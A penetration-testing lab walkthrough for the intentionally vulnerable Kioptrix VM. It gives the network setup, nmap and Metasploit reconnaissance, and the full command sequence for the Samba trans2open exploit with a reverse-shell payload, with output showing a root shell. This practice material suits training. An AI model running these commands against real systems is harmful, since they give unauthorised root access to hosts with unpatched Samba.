FOR DOING THIS PRACTICAL AT FIRST YOU HAVE TO DOWNLOAD KIOPTRIX ::

DOWNLOAD LINK:

After that open that virtual machine in vmware .
Then go to the folder where you have installed in your pc. you will find kioptrix VMware virtual machine configuration file open that file in Notepad.
NOW search Bridged in notpad.
change ethernet0.connectionType = "Bridged" to ethernet0.connectionType = "nat" other same and save this file.
FINALLY Resume this virtual machine than only ip address will allocate in kali linux machine.

PERFORMING PRACTICAL:

====== STEP 1 =========

ifconfig
arp-scan -l
nmap -sV -T4 192.168.91.137(ip address of vulnerable machine)
msfconsole
search smb_version
use auxiliary/scanner/smb/smb_version
show options
set RHOSTS 192.168.91.137(ip address of vulnerable machine)
show options
run

====== STEP 2 ========

msfconsole
search trans2open
use exploit/linux/samba/trans2open
set payload generic/shell_reverse_tcp
show options
set RHOSTS 192.168.91.137(ip address of vulnerable machine)
show options
exploit

=========== RESULT =============

pwd
/tmp
whoami
root
id
uid=0(root) gid=0(root) groups=99(nobody)
ls
touch Binod.txt
ls
Binod.txt
mkdir Hackerboy
ls
Binod.txt
Hackerboy

========== OR DIRECT METHOD =====

msf > msfconsole
msf > search 2003-0201
msf > use exploit/linux/samba/trans2open
msf exploit(trans2open) > set rhost 192.168.80.132
msf exploit(trans2open) > set payload generic/shell_reverse_tcp
msf exploit(trans2open) > exploit
